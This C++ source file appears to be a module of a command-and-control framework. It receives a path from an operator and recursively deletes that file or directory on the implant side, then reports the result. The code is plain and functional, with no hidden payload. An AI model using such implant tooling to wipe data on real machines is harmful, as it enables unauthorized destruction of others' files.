#include "Remove.hpp"

#include "Common.hpp"

#include <filesystem>
#include <cstring>

using namespace std;
namespace fs = std::filesystem;

constexpr std::string_view moduleName = "remove";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32
__declspec(dllexport) Remove* RemoveConstructor()
{
    return new Remove();
}
#else
__attribute__((visibility("default"))) Remove* RemoveConstructor()
{
    return new Remove();
}
#endif

Remove::Remove()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Remove::~Remove()
{
}

std::string Remove::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "remove Module:\n";
    info += "Delete a file or directory.\n";
    info += "\nUsage:\n";
    info += " - remove <path>\n";
#endif
    return info;
}

int Remove::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    if (splitedCmd.size() >= 2)
    {
        std::string path;
        for (size_t i = 1; i < splitedCmd.size(); ++i)
        {
            if (!path.empty())
                path += " ";
            path += splitedCmd[i];
        }
        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_cmd(path);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif
    return 0;
}

#define ERROR_REMOVE 1
int Remove::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    std::string path = c2Message.cmd();
    c2RetMessage.set_instruction(c2RetMessage.instruction());
    c2RetMessage.set_cmd(path);

    std::error_code ec;
    fs::remove_all(path, ec);
    if (!ec)
    {
        c2RetMessage.set_returnvalue("Removed.");
    }
    else
    {
        c2RetMessage.set_errorCode(ERROR_REMOVE);
    }
    return 0;
}

int Remove::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    if (c2RetMessage.errorCode() == ERROR_REMOVE)
        errorMsg = "Failed: Could not remove path";
#endif
    return 0;
}
